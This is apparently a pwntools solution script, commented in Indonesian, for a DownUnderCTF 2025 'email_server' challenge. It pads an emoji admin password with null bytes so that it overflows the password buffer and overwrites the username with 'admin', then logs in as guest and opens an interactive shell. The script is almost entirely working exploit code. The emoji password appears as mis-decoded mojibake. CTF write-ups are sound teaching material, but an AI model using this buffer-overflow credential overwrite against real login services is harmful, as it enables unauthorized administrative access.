from pwn import *

# Untuk remote
host = 'chal.2025.ductf.net'
port = 30000

# Untuk lokal testing:
# elf = ELF('./email_server')
# p = process(elf.path)

# Emoji password: ğŸ‡¦ğŸ‡©ğŸ‡²ğŸ‡®ğŸ‡³
admin_pw = "ğŸ‡¦ğŸ‡©ğŸ‡²ğŸ‡®ğŸ‡³".encode('utf-8')  # ini akan jadi ~16 byte

payload = admin_pw + b"\x00" * (32 - len(admin_pw))  # isi password hingga 32 byte
payload += b"admin\x00"                              # timpa username

# Start koneksi
p = remote(host, port)

# Interaksi login
p.sendlineafter(b"username:", b"guest")
p.sendlineafter(b"password:", payload)

# Dapat shell!
p.interactive()
